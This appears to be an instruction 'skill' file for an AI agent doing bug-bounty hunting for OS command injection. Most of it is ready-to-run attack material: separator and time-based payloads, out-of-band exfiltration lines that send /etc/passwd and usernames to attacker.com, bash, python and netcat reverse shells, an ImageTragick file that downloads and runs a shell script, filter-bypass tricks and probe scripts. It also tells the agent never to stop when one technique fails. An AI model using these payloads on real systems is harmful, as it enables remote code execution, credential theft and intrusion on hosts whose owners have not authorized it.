---
name: hunt-command-injection
description: "Use this skill when input reaches system shell — params that look like hostnames/IPs/filenames/URLs flowing into ping/nslookup/traceroute/curl/wget/git/imagemagick/ffmpeg/pdf-generators/dns-tools; when error pages show shell error messages; when source code shows system()/exec()/shell_exec()/Runtime.exec/subprocess; when network diagnostic features exist; when file converters / image resizers / PDF generators take user input. Load automatically for admin panels, network appliances, router UIs, NAS devices, monitoring tools, CI/CD webhooks, file-processing endpoints. Only invoke if real impact potential — actual code execution. Skip theoretical findings."
type: hunt
---

# Hunt: OS Command Injection

## Crown Jewel Targets
- **Network diagnostic tools** (ping, traceroute, nslookup, whois) — classic RCE (Critical)
- **Image processing (ImageMagick / GhostScript)** — CVE-2016-3714 / CVE-2018-16509 (Critical)
- **PDF generators (wkhtmltopdf, weasyprint, dompdf)** — JS-to-shell chain (Critical)
- **Webhook URL features** — git clone, curl proxy, import-from-URL = shell exec on backend (Critical)
- **CI/CD config (Jenkins, GitLab Runner) groovy / shell** — direct shell access (Critical, $5k+)
- **File-extension converters** (docx→pdf, mp4→gif) — ffmpeg / libreoffice CLI = injection (High–Critical)
- **DNS lookup / SMTP test features** in admin panels (Critical)
- **Backup / restore filename params** flowing into tar/zip CLI (Critical)

## Detection Signals
- Error responses: `sh: 1: not found`, `bash: command not found`, `/bin/sh:`, `cmd.exe`, `is not recognized as an internal or external command`, `system() failed`, `child process exited with code`
- Source-code grep: `system(`, `exec(`, `shell_exec(`, `passthru(`, `proc_open(`, `popen(`, `Runtime.getRuntime().exec(`, `ProcessBuilder(`, `subprocess.call(`, `subprocess.Popen(`, `os.system(`, `os.popen(`, `eval(`, `\`...\`` (backticks)
- Features: ping/traceroute UI, "test connection", import from URL, avatar URL fetch, webhook URL, PDF export, image resize, CSV import
- Banners: ImageMagick, GhostScript, ffmpeg, wkhtmltopdf, LibreOffice
- Response delay matches `sleep N` payload = blind RCE confirmed

## Attack Techniques
1. **Separator injection** — `;`, `&&`, `||`, `|`, `&`, `\n` (`%0a`), `\r` (`%0d`), `\r\n`. Try each, observe extra command output appended.
2. **Subshell substitution** — `$(id)`, backticks `` `id` ``, `${id}` in some shells.
3. **Blind RCE via DNS/HTTP** — `; curl http://attacker.com/$(whoami)`, `; nslookup $(whoami).attacker.com`. Use Burp Collaborator or interactsh.
4. **Time-based blind** — `; sleep 10`, `&& sleep 10`, `$(sleep 10)`, `` `sleep 10` ``. Compare response time.
5. **Windows variants** — `&`, `&&`, `|`, `||`, `%0a` (CRLF), `^` escape char (`who^ami`).
6. **PowerShell stage** — `; powershell -enc <base64>` for Windows targets.
7. **ImageMagick MVG/MSL** — upload crafted `.svg`/`.mvg`/`.png` with `url("|id")` (CVE-2016-3714 — "ImageTragick").
8. **wkhtmltopdf to local file read** — `<iframe src="file:///etc/passwd">` in input HTML.
9. **Git command injection** — webhook URL `--upload-pack="$(id)"` or `--ext::sh -c id`.
10. **Curl-based smuggling** — input flows to `curl $USERINPUT`; payload `https://x.com -o /tmp/sh; bash /tmp/sh`.
11. **Argument injection (no shell metachar)** — `--config=ssh_key.txt`, `-o ProxyCommand=id`, `--upload-pack=id` in git/ssh/curl.
12. **Environment variable injection** — bash `(){:;};` Shellshock-style on legacy CGI.
13. **Out-of-band exfil** — `; curl --data @/etc/passwd attacker.com`, `; wget http://attacker.com/?d=$(cat /etc/passwd|base64)`.

## Payloads
**Basic separators (test each):**
```
; id
& id
&& id
| id
|| id
%0a id
%0d%0a id
$(id)
`id`
${IFS}id
;${IFS}id
;sleep${IFS}10
```

**Time-based blind:**
```
; sleep 10
& sleep 10
&& sleep 10
| sleep 10
$(sleep 10)
`sleep 10`
;ping -c 10 127.0.0.1
| timeout 10        # Windows
& ping -n 10 127.0.0.1     # Windows
```

**Out-of-band (OOB) exfil:**
```
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
; ping $(whoami).attacker.com
; wget http://attacker.com/?d=$(id|base64)
| curl http://attacker.com/$(cat /etc/passwd|base64 -w0)
& nslookup %USERNAME%.attacker.com         # Windows
& powershell -c "iwr http://attacker.com/$env:USERNAME"
```

**Reverse shell:**
```
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; sh -i >& /dev/tcp/ATTACKER/4444 0>&1
; python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
; nc -e /bin/sh ATTACKER 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
| powershell -e <base64-of-revshell>    # Windows
```

**Bypass spaces (no-space injection):**
```
;cat${IFS}/etc/passwd
;cat$IFS$9/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
;X=$'cat\x20/etc/passwd';$X
```

**ImageMagick (ImageTragick) — upload as .png/.svg/.mvg:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/x.png"|wget http://attacker.com/sh -O /tmp/sh; bash /tmp/sh")'
pop graphic-context
```

**Argument injection (no metachar):**
```
--help                                # confirm binary identity
-oProxyCommand=id                     # ssh / scp
--upload-pack=id                      # git
--config=core.sshCommand=id           # git
-o /tmp/sh https://attacker.com/sh    # curl write file
```

## Bypass Methods
| Filter | Bypass |
|--------|--------|
| Strips `;` `&` `|` | Use `%0a` (newline), `$()`, backticks, `&&`, `||` |
| Strips spaces | `${IFS}`, `$IFS$9`, `{cmd,arg}`, `<` redirect, tab `%09` |
| Whitelist `[a-z0-9.]+` (e.g., domain validator) | Argument injection with `-` flag if binary accepts |
| Removes shell metachars | Argument injection: `--config=...`, `-oProxy=...` |
| Blacklist keywords (`cat`, `wget`) | `c''at`, `c\at`, `who$()ami`, base64: `bash<<<$(base64 -d<<<aWQ=)` |
| Strips `/` (path) | `${PATH:0:1}etc${PATH:0:1}passwd` |
| Length-limited | Stage: write to /tmp via short payload, then exec |
| WAF on params | Try headers (User-Agent, X-Forwarded-For, Cookie) reaching shell |
| `escapeshellarg()` used | Look for unquoted contexts, argument injection still works |
| Output suppressed | OOB via DNS/HTTP, time-based blind |

## Tools
```bash
# Commix — automated command injection
commix -u "https://target.com/ping?host=test" --cookie="sess=..."
commix -u "https://target.com/api" --data='{"host":"test"}' --headers="Content-Type: application/json"

# Burp Collaborator / interactsh for OOB
interactsh-client    # get domain, use in payloads

# nuclei
nuclei -t vulnerabilities/generic/oob-command-injection.yaml -u https://target.com

# Manual one-liner probe
for p in ';id' '&&id' '|id' '`id`' '$(id)' ';sleep 5'; do
  echo "[$p]"; time curl -s "https://target.com/ping?host=1.1.1.1$p"; done

# ImageMagick test (ImageTragick)
echo 'push graphic-context
fill "url(https://attacker.com/x|id)"
pop graphic-context' > exploit.mvg
curl -F file=@exploit.mvg https://target.com/upload
```

## Impact
- **Critical**: Confirmed RCE on production server, root shell, AWS metadata exfil, SSH key dump, lateral movement
- **High**: Blind RCE confirmed via OOB DNS/HTTP, file read on sensitive paths
- **Medium**: Limited command execution in restricted container without sensitive data access

## Chain Potential
- **+ SSRF** = command injection in URL-fetch features, escalate via metadata service (`curl 169.254.169.254`)
- **+ File upload** = upload .png with ImageMagick MVG → RCE on processor
- **+ Argument injection** = no shell metachar but binary flags reachable → still RCE
- **+ Auth bypass** = pre-auth RCE on admin panel = trivial Critical
- **+ Cloud IAM** = RCE → steal IAM role → escalate (use `cloud-iam-deep`)
- **+ Container escape** = RCE inside Docker → break out via privileged caps / mounted socket
- **+ Internal pivot** = RCE = internal recon, lateral SSH/SMB
- **+ Webhook + git** = git command injection in repo URL → RCE on CI runner

## Fallback Chain
1. If standard separators (`;` `&` `|`) are filtered, switch to `$()`, backticks, `%0a` newline, `${IFS}` for spaces.
2. If output is suppressed (blind), confirm via time-based `sleep 10` and out-of-band DNS via interactsh / Burp Collaborator.
3. If shell metachar filtering is strict, try argument injection — pass `-o`, `--config=`, `--upload-pack=` to underlying binary; ImageTragick-style file payloads to image processors.
4. Pivot to alternate sinks: PDF generator HTML→file://, ffmpeg HLS playlist SSRF, git clone via `ext::sh`, webhook URL with `git+ssh://`. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title | Program | Bounty | Source |
|---|---|---|---|
| RCE via GitHub import | GitLab | $33,510 | H1 #1679624 |
| RCE via DecompressedArchiveSizeValidator + Project BulkImports | GitLab | $33,510 | H1 #1609965 |
| Snapchat Exposed Kubernetes API → RCE / creds | Snapchat | $25,000 | H1 #455645 |
| Twitter VPN potential pre-auth RCE | X / xAI | $20,160 | H1 #591295 |
| phpobject in cookie → remote shell | Pornhub | $20,000 | H1 #141956 |
| Git flag injection → file overwrite → RCE | GitLab | $12,000 | H1 #658013 |
| Git flag injection - Search API scope 'blobs' | GitLab | $7,000 | H1 #682442 |
| RCE on Basecamp.com | Basecamp | $5,000 | H1 #365271 |
| Mapbox Admin Panel + OAuth bypass | Mapbox | $4,000 | H1 #294911 |
| Git flag injection → file overwrite, potential RCE | GitLab | $3,500 | H1 #653125 |
| RCE of Burp Scanner/Crawler via Clickjacking | PortSwigger | $3,000 | H1 #1274695 |
| OS Cmd Injection at sea-web.gold.razer.com/lab/ws-lookup IP | Razer | $2,000 | H1 #821962 |
| JMX RMI command injection on Mail.ru Gaming | Mail.ru | $2,000 | H1 #703910 |
| Vanilla Forums AddonManager getSingleIndex → RCE | Vanilla | $900 | H1 #411140 |
| H1514 RCE on kitcrm via bulk customer update | Shopify | $0 | H1 #422944 |
| RCE on semrush.com/my_reports via Logo upload | Semrush | $0 | H1 #403417 |
| Webshell via File Upload on ecjobs.starbucks.com.cn | Starbucks | $0 | H1 #506646 |
| Ubiquiti unauth cmd exec → SYSTEM | Ubiquiti | $0 | H1 #544928 |

**PROVEN techniques** (3+ paid reports each):
- **Git flag injection** (GitLab #658013, #682442, #653125, #824689) — `--upload-pack`, `--config`, `-c` flags passed unsanitized into `git clone` / `git fetch` → arbitrary file write → RCE.
- **Import-from-URL → RCE** (GitLab GitHub-import #1679624, #1672388; BulkImports #1609965) — server fetches and processes attacker repos with vulnerable parsers.
- **Image-processing argument injection (ImageTragick / gm convert)** (Imgur #212696, image-tragick variants) — `gm convert ... /attacker.png` with crafted filename injects shell.
- **Webshell upload via insufficient extension check** (Starbucks #506646, Semrush #403417, Vanilla #411140) — double-extension / null-byte / MIME tricks land .php/.jsp on a webroot.
- **Cookie/phpobject deserialization → RCE** (Pornhub #141956) — pickle/PHP object in cookie → object instantiation → command execution.

## High-Value Chains (from Reports)

- **Import URL → Git flag injection → file overwrite → RCE** — GitLab (H1 #658013, $12K + #1679624 $33.5K): user-supplied repo URL passed to `git clone` with attacker-controlled `--upload-pack=/tmp/sh`, writing arbitrary files inside the worker → code execution.
- **Exposed Kubernetes API → cluster RCE + secret exfil** — Snapchat (H1 #455645, $25K): unauthenticated kube-apiserver let attacker `kubectl exec` into pods, dump AWS/GCP creds.
- **File upload → webshell → RCE → mass DB access** — Starbucks (H1 #506646): bypassed extension blocklist on jobs portal, uploaded JSP/PHP webshell, escalated to internal data.
- **SSTI in mail-template → cmd injection → RCE** — Mail.ru (H1 #536130, $2K): Jinja-like template engine in a Mail.ru acquisition allowed `{{ ''.__class__... }}` → `os.system`.
- **Bulk-update endpoint → cmd injection in shell-out (libxml / mogrify / unzip)** — Shopify kitcrm (H1 #422944, $0 internal), Vanilla AddonManager (H1 #411140) — admin-only feature shelled out to a binary using user input.
- **OAuth bypass → Admin panel → RCE** — Mapbox (H1 #294911, $4K): broken OAuth let attacker reach admin console which exposed a command-shell-style "exec query" feature.
